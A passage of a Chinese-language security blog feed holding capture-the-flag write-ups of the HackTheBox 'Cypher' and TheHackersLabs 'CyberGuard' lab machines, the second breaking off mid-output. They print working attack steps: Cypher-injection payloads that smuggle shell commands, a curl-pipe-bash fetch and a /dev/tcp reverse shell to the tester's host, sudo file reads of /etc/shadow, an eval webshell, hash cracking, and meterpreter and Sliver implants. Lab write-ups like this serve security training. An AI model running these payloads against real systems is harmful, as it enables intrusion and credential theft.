                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "Mysql",
                "Python"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher",
            "content_html": "# Season7-Cypher\n\n> https://app.hackthebox.com/machines/Cypher | `Linux · Medium`\n> \n\n## 前期踩点\n\n`10.10.11.57` 是靶机\n\n```bash\n⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -min-rate 10000 -p- 10.10.11.57              \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:19 EST\nNmap scan report for 10.10.11.57\nHost is up (0.13s latency).\nNot shown: 65352 filtered tcp ports (no-response), 181 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 26.15 seconds\n```\n\n发现域名 `http://cypher.htb/` 添加到`hosts`文件\n\n```bash\n⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -A -T4 -O -p 22,80 10.10.11.57               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:20 EST\nNmap scan report for 10.10.11.57\nHost is up (0.25s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)\n|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://cypher.htb/\n|_http-server-header: nginx/1.24.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   502.38 ms 10.10.16.1\n2   586.07 ms 10.10.11.57\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 43.03 seconds\n```\n\n扫描`UDP`端口\n\n```bash\n⚡ root@kali  ~/Desktop/test/cypher  nmap -sU -min-rate 10000 -p- cypher.htb \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:25 EST\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\nNmap scan report for cypher.htb (10.10.11.57)\nHost is up (4.6s latency).\nNot shown: 65517 open|filtered udp ports (no-response)\nPORT      STATE  SERVICE\n476/udp   closed tn-tl-fd1\n5749/udp  closed unknown\n16119/udp closed unknown\n16380/udp closed unknown\n16424/udp closed unknown\n32237/udp closed unknown\n33895/udp closed unknown\n39619/udp closed unknown\n40153/udp closed unknown\n42240/udp closed unknown\n42704/udp closed unknown\n45096/udp closed unknown\n53762/udp closed unknown\n55811/udp closed unknown\n56083/udp closed unknown\n59387/udp closed unknown\n60627/udp closed unknown\n62347/udp closed unknown\n```\n\n扫描一下子域名\n\n```bash\n⚡ root@kali  ~/Desktop/test/cypher  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H 'Host:FUZZ.cypher.htb' -u http://cypher.htb                               \n\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://cypher.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                       \n=====================================================================\n\nTotal time: 199.7973\nProcessed Requests: 4989\nFiltered Requests: 4989\nRequests/sec.: 24.97030\n```\n\n访问`HTTP`主页，这个动画效果将我的`Kali`击碎\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image27.png)\n\n貌似在登录框存在`SQL`注入，使用`SQLMAP`和手动注入无果\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image28.png)\n\n扫描目录\n\n```bash\n⚡ root@kali  ~/Desktop/test/cypher  dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt\n\nTarget: http://cypher.htb/\n\n[08:33:32] Starting: \n[08:33:56] 200 -    5KB - /about\n[08:34:17] 307 -    0B  - /api/  ->  http://cypher.htb/api/api\n[08:34:17] 307 -    0B  - /api  ->  /api/docs\n[08:34:42] 307 -    0B  - /demo  ->  /login\n[08:34:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo\n[08:35:10] 200 -    4KB - /login\n[08:35:10] 200 -    4KB - /login.html\n[08:35:49] 301 -  178B  - /testing  ->  http://cypher.htb/testing/\n```\n\n发现新目录`testing` ，访问下载了`jar`文件\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image29.png)\n\n## 反编译 jar\n\n将`jar`文件下载下来，使用`jd-gui`反编译\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image30.png)\n\n在其中发现貌似可以命令执行地方\n\n```bash\nString[] command = { \"/bin/sh\", \"-c\", \"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \" + url };\n```\n\n丢到`GPT`里进行分析：\n\n- 该 Java 代码是 Neo4j 自定义 APOC（Awesome Procedures on Cypher）扩展的一部分，提供 `custom.getUrlStatusCode` 过程。\n- 该过程接收一个 URL，使用 `curl` 命令获取其 HTTP 状态码，并返回。\n- **攻击示例执行效果**这会导致服务器泄露敏感文件 `/etc/passwd`。\n    \n    ```\n    CALL custom.getUrlStatusCode(\"https://example.com; cat /etc/passwd\")\n    ```\n    \n    ```\n    curl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; cat /etc/passwd\n    ```\n    \n\n## Cypher Injection\n\n看到`neo4j`才发现上面的压根不是`SQL`注入 https://neo4j.com/docs/getting-started/cypher/\n\n> Cypher is Neo4j’s declarative and GQL conformant query language. Available as open source via The openCypher project, Cypher is similar to SQL, but optimized for graphs. | Cypher 是 Neo4j 的声明式和符合 GQL 的查询语言。Cypher 可通过openCypher 项目以开源形式获得，它类似于 SQL，但针对图形进行了优化。\n> \n\n尝试了使用`cyphermap`但是始终返回`Unable to find valid injection type...`\n\n通过 ：https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection 可以了解到`Cypher`注入\n\n随便输入点东西可以在错误中发现查询语句\n\n```bash\n{message: Variable `c` not defined (line 1, column 75 (offset: 74))\n\"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash\"\n                                                                           ^}\n```\n\n成功闭合\n\n```bash\n{\"username\":\"admin' or 1=1 return h.value as hash//\",\"password\":\"1\" }\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image31.png)\n\n带外测试\n\n```bash\n{\"username\":\"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//\",\"password\":\"1\" }\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image32.png)\n\n然后可以通过`custom` 用来引用自定义的程序或函数，也就是上面带有命令执行的方法 https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/\n\n成功带外，但是无回显\n\n```bash\n{\n\t\"username\":\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;whoami\\\") YIELD statusCode AS a RETURN a;//\",\n\t\"password\":\"1\" \n}\n```\n\n构造`payload`\n\n1. 在kali创建带有反弹shell语句的文件shell.txt（让服务器访问）\n    \n    ```bash\n    /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.34/1234 0>&1'\n    ```\n    \n2. 开启监听\n    \n    ```bash\n    ⚡ root@kali  ~/Desktop/test/cypher  nc -lvnp 1234\n    listening on [any] 1234 ...\n    ```\n    \n3. 开启简易服务器\n4. 构造`payload`\n    \n    ```bash\n    {\n    \t\"username\":\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\\\") YIELD statusCode AS a RETURN a;//\",\n    \t\"password\":\"1\" \n    }\n    ```\n    \n    成功获得`shell`\n    \n    ![image.png](/post-images/HackTheBoxSeason7-Cypher/image33.png)\n    \n\n## 提权\n\n信息收集一波\n\n```bash\nneo4j@cypher:/home/graphasm$ ls -al\ntotal 56\ndrwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .\ndrwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..\nlrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null\n-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout\n-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot\n-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml\ndrwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config\ndrwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .local\n-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile\ndrwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutput\n-rw-r----- 1 root     graphasm   33 Mar  2 11:16 user.txt\n```\n\nbbot_preset.yml 得到一组账号密码\n\n```bash\nneo4j@cypher:/home/graphasm$ cat bbot_preset.yml\ntargets:\n  - ecorp.htb\n\noutput_dir: /home/graphasm/bbot_scans\n\nconfig:\n  modules:\n    neo4j:\n      username: neo4j\n      password: cU4btyib.20xtCMCXkBmerhK\n```\n\n但是使用`neo4j`登陆不成功，密码碰撞使用`graphasm`登陆成功\n\n```bash\n⚡ root@kali  ~/Desktop/test/cypher  ssh graphasm@10.10.11.57                            \ngraphasm@10.10.11.57's password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sun Mar  2 03:13:58 PM UTC 2025\n\n  System load:  0.0               Processes:             243\n  Usage of /:   74.2% of 8.50GB   Users logged in:       1\n  Memory usage: 66%               IPv4 address for eth0: 10.10.11.57\n  Swap usage:   0%\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 2 15:13:59 2025 from 10.10.16.34\ngraphasm@cypher:~$ \n```\n\n在家目录下可以读取`UserFlag`\n\n```bash\ngraphasm@cypher:~$ cat user.txt \n63a155f3be93bac8eec086ec22459b65\n```\n\n查看graphasm用户权限\n\n```bash\ngraphasm@cypher:~$ sudo -l\nMatching Defaults entries for graphasm on cypher:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser graphasm may run the following commands on cypher:\n    (ALL) NOPASSWD: /usr/local/bin/bbot\n```\n\n查看`bbot`帮助\n\n```bash\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot   \n  ______  _____   ____ _______               \n |  ___ \\|  __ \\ / __ \\__   __|                                                                                                                                                                                    \n | |___) | |__) | |  | | | |                                                                             \n |  ___ <|  __ <| |  | | | |                  \n | |___) | |__) | |__| | | |                                                                             \n |______/|_____/ \\____/  |_|                                                                             \n BIGHUGE BLS OSINT TOOL v2.1.0.4939rc                                                                    \n                                                                                                         \nwww.blacklanternsecurity.com/bbot                                                                        \n                                                                                                         \nusage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]\n            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]\n            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]\n            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]\n                                                    \nBighuge BLS OSINT Tool                                                                                   \n                                                                                                         \noptions:                                                                                                 \n  -h, --help            show this help message and exit\n                                                                                                         \nTarget:                \n  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]                             \n                        Targets to seed the scan\n  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]\n                        What's considered in-scope (by default it's the same as --targets)\n  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]\n                        Don't touch these things                                                         \n  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope                                                                                                                               \n                                                                                                         \nPresets:                                           \n  -p [PRESET ...], --preset [PRESET ...]                                                                 \n                        Enable BBOT preset(s)                                                            \n  -c [CONFIG ...], --config [CONFIG ...]                                                                                                                                                                           \n                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'    \n  -lp, --list-presets   List available presets.     \n                                                                                                         \nModules:                                                                                                 \n  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]                                                  \n                        Modules to enable. Choices: dnsbrute,paramminer_headers,github_org,ipneighbor,chaos,securitytxt,viewdns,baddns,ip2location,wpscan,bypass403,generic_ssrf,certspotter,urlscan,badsecrets,cre\ndshed,dastardly,asn,postman_download,virustotal,columbus,ntlm,c99,internetdb,httpx,git_clone,trufflehog,bucket_file_enum,subdomaincenter,filedownload,github_workflows,code_repository,trickest,fingerprintx,newsle\ntters,ffuf,anubisdb,crt,bucket_firebase,nuclei,portscan,unstructured,bucket_amazon,pgp,ffuf_shortnames,paramminer_cookies,azure_tenant,censys,dnscommonsrv,zoomeye,securitytrails,bucket_digitalocean,azure_realm,i\nis_shortnames,bucket_azure,binaryedge,dnscaa,wayback,affiliates,url_manipulation,gowitness,otx,docker_pull,github_codesearch,telerik,gitlab,secretsdb,dnsbrute_mutations,myssl,emailformat,digitorus,paramminer_get\nparams,bevigil,fullhunt,vhost,oauth,hunt,dnsdumpster,passivetotal,baddns_zone,host_header,sitedossier,shodan_dns,bucket_google,social,wappalyzer,wafw00f,leakix,hackertarget,rapiddns,sslcert,git,robots,dotnetnuke\n,skymem,baddns_direct,smuggler,builtwith,ipstack,postman,dehashed,hunterio,ajaxpro,dockerhub             \n  -l, --list-modules    List available modules.                                                                                                                                                                    \n  -lmo, --list-module-options                                                                            \n                        Show all module config options        \n  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]                                         \n                        Exclude these modules.\n  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]\n                        Enable modules by flag. Choices: iis-shortnames,social-enum,service-enum,portscan,web-screenshots,slow,subdomain-enum,affiliates,web-thorough,safe,cloud-enum,web-paramminer,active,baddns,\ndeadly,aggressive,code-enum,subdomain-hijack,passive,web-basic,report,email-enum                         \n  -lf, --list-flags     List available flags. \n  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]                                                   \n                        Only enable modules with these flags (e.g. -rf passive)                          \n  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]                                                   \n                        Disable modules with these flags. (e.g. -ef aggressive)                          \n  --allow-deadly        Enable the use of highly aggressive modules                                      \n                                                                                                         \nScan:                                                                                                                                                                                                              \n  -n SCAN_NAME, --name SCAN_NAME                                                                                                                                                                                   \n                        Name of scan (default: random)                                                                                                                                                             \n  -v, --verbose         Be more verbose                                                                                                                                                                            \n  -d, --debug           Enable debugging            \n  -s, --silent          Be quiet                                                                         \n  --force               Run scan even in the case of condition violations or failed module setups        \n  -y, --yes             Skip scan confirmation prompt                                                    \n  --dry-run             Abort before executing scan                                                      \n  --current-preset      Show the current preset in YAML format                                           \n  --current-preset-full\n                        Show the current preset in its full form, including defaults\n                                                    \nOutput:                                                                                                  \n  -o DIR, --output-dir DIR                                                                               \n                        Directory to output scan results             \n  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]                                          \n                        Output module(s). Choices: csv,discord,splunk,websocket,subdomains,txt,teams,emails,http,neo4j,asset_inventory,stdout,web_report,python,slack,json                                         \n  --json, -j            Output scan data in JSON format   \n  --event-types EVENT_TYPES [EVENT_TYPES ...]                                                            \n                        Choose which event types to display                                              \n                                                                                                                                                                                                                   \nModule dependencies:                                                                                     \n  Control how modules install their dependencies    \n                                                                                                         \n  --no-deps             Don't install module dependencies                                                \n  --force-deps          Force install all module dependencies                                            \n  --retry-deps          Try again to install failed module dependencies                                                                                                                                            \n  --ignore-failed-deps  Run modules even if they have failed dependencies                                                                                                                                          \n  --install-all-deps    Install dependencies for all modules                                                                                                                                                       \n                                                                                                                                                                                                                   \nMisc:                                                                                                                                                                                                              \n  --version             show BBOT version and exit                                                       \n  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]                                                                                                                     \n                        List of custom headers as key value pairs (header=value).                        \n  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES\n                        Add custom yara rules to excavate                                                \n                                                    \nEXAMPLES                                     \n                                                                                                                                                                                                                   \n    Subdomains:                                                                                          \n        bbot -t evilcorp.com -p subdomain-enum\n                                                                                                         \n    Subdomains (passive only):                                                                           \n        bbot -t evilcorp.com -p subdomain-enum -rf passive                                               \n                                                                                                         \n    Subdomains + port scan + web screenshots:                                                            \n        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .                     \n                                                                                                                                                                                                                   \n    Subdomains + basic web scan:                                                                                                                                                                                   \n        bbot -t evilcorp.com -p subdomain-enum web-basic                                                                                                                                                           \n                                                                                                                                                                                                                   \n    Web spider:                                     \n        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2                   \n                                                                                                         \n    Everything everywhere all at once:                                                                   \n        bbot -t evilcorp.com -p kitchen-sink                                                             \n                                                                                                         \n    List modules:      \n        bbot -l                                                                                          \n                                                    \n    List presets:                                                                                        \n        bbot -lp                                                                                         \n                                                                                                         \n    List flags:                                                                                          \n        bbot -lf                                                                                        \n```\n\n构造任意文件读取\n\n读取文件大点的文件，容易看见输出\n\n```bash\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /etc/shadow -d \n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image34.png)\n\n读取`root.txt`\n\n```bash\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d \n```\n\n```bash\n63582a9da70699c87d6bd78e92aa9a71\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image35.png)\n",
            "url": "https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher",
            "title": "HackTheBox - Season7 - Cypher",
            "summary": "Season7 Cypher https://app.hackthebox.com/machines/Cypher | Linux · Medium 前期踩点 10.10.11.57 是靶机 发现域名 http://cypher.htb/ 添加到hosts文件 扫描UDP端口 扫描一下子域名 访问H...",
            "date_modified": "2025-04-04T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux靶机"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard",
            "content_html": "\n# CyberGuard\n\n> https://labs.thehackerslabs.com/machine/25\n> \n\n![image.png](/post-images/TheHackersLabsCyberGuard/image.png)\n\n一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image1.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  CyberGuard nmap -sn 10.0.2.0/24                   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report for 10.0.2.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report for 10.0.2.10\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.2.20\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.21 seconds\n```\n\n```bash\n➜  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report for 10.0.2.10\nHost is up (0.0013s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds\n```\n\n```bash\n➜  CyberGuard nmap -sT -A -p 80 10.0.2.10                                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:12 CST\nNmap scan report for 10.0.2.10\nHost is up (0.00056s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx\n|_http-title: Site doesn't have a title (application/octet-stream, text/plain; charset=UTF-8).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): FreeBSD 11.X (92%)\nOS CPE: cpe:/o:freebsd:freebsd:11.2\nAggressive OS guesses: FreeBSD 11.2-RELEASE (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 10.0.2.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.56 seconds\n```\n\n### 枚举\n\n`HTTP` 服务\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image2.png)\n\n目录爆破，这里扫描久了会被 ban 掉\n\n```bash\n➜  CyberGuard gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.0.2.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.0.2.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 274]\n/index.php            (Status: 200) [Size: 1048]\n/search               (Status: 200) [Size: 2046]\n/admin                (Status: 302) [Size: 378] [--> http://10.0.2.10/admin/auth/login]\n/up                   (Status: 200) [Size: 2130]\n```\n\n这个 `query` 和输出结果感觉有股熟悉的味\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image3.png)\n\n`sqlmap` 跑一波\n\n```bash\nsqlmap -r packet -batch --level 3 --risk 3\n```\n\n真跑出来了，在 `UA` 中存在注入点\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image4.png)\n\n## SQL Injection\n\n使用 `sqlmap` 直接全给爆出来\n\n```bash\ncurrent database: 'cyberguard\ncurrent user: 'ian@localhost'\n\n+------------------------+\n| cache                  |\n| admin_menu             |\n| admin_operation_log    |\n| admin_permissions      |\n| admin_role_menu        |\n| admin_role_permissions |\n| admin_role_users       |\n| admin_roles            |\n| admin_user_permissions |\n| admin_users            |\n| blacklist_user_agents  |\n| cache_locks            |\n| failed_jobs            |\n| job_batches            |\n| jobs                   |\n| migrations             |\n| password_reset_tokens  |\n| sessions               |\n| users                  |\n+------------------------+\n\n# admin_user\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n\n```\n\n爆破一下密码\n\n```bash\n➜  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt hash       \nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nkiller           (?)     \n1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\n得到明文密码 `killer`\n\n## 后台利用\n\n来到网站后台尝试进行登录\n\n成功进入后台\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image5.png)\n\n后台里面有个命令执行的功能（图中的 `shell`）\n\n成功执行命令\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image6.png)\n\n再拿 `/etc/passwd` 的信息，能知道 `ian` 用户是存在的\n\n```bash\nian:x:1000:1000:ian,,,:/home/ian:/bin/bash\n```\n\n### 尝试 1 ❌\n\n尝试反弹 `shell` ，这里使用 `nc` 和 `/bin/bash` 都无法弹出来，一直在加载\n\n后台还有一个上传功能点，但是没找到上传的文件夹在哪\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image7.png)\n\n尝试使用命令行来找到上传的文件夹在哪\n\n```bash\nfind / -name 'result.php' 2>/dev/null\n```\n\n通过 find 命令能找到存放在 `/var/www/cyberguard/storage/app/private/result.php`\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image8.png)\n\n再看一下当前目录在哪，在 `/var/www/cyberguard/public`\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image9.png)\n\n我们应该是没有办法切换过去\n\n所以这里尝试直接写入`webshell`\n\n```bash\necho '<?php eval($_POST[\"x\"]);phpinfo();?>' > test.php\n```\n\n可以执行命令\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image10.png)\n\n但结果还是无法进行反弹 `shell` ，被阻止\n\n### 尝试 2 ❌\n\n尝试使用 `MSF` 来拿到 `shell`\n\n```bash\n➜  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: sunset\n```\n\n上传后在命令执行窗口执行如下命令\n\n```bash\nchmod +x /var/www/cyberguard/storage/app/private/sunset\n/var/www/cyberguard/storage/app/private/sunset\n```\n\n这里还尝试很多种`payload` ，例如`cmd/linux/http/x64/meterpreter_reverse_http`  等\n\n但是结果和在 `WebShell` 反弹一样，被阻止了\n\n### 尝试 3 ✅\n\n这里尝试使用 `sliver` \n\n> https://github.com/BishopFox/sliver\n> \n\n`sliver` 有很高的隐蔽性和免杀性能，并且也支持其他的协议\n\n```bash\n➜  CyberGuard sliver\nConnecting to localhost:31337 ...\n\n    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗\n    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗\n    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝\n    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗\n    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║\n    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝\n\nAll hackers gain persist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\nsliver >  \n```\n\n使用 `WireGuard` 协议生成植入物并监听\n\n```bash\nsliver > generate --wg 10.0.2.20 -o linux -a amd64 -f binary\n\n[*] Generated unique ip for wg peer tun interface: 100.64.0.2\n[*] Generating new linux/amd64 implant binary\n[*] Symbol 